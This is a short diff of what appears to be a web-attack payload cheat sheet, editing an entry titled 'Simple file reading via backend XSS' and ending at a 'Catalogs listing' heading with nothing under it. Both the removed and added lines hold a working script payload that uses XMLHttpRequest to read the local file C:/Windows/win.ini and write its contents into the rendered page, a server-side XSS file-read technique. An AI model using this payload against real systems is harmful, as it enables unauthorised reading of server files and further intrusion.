@@ -1,6 +1,6 @@
 Simple file reading via backend XSS:
 
-<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///C:/Windows/win.ini"); x.send(); </script>
+<html><script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///C:/Windows/win.ini"); x.send(); </script></html>
 
 Catalogs listing:
 
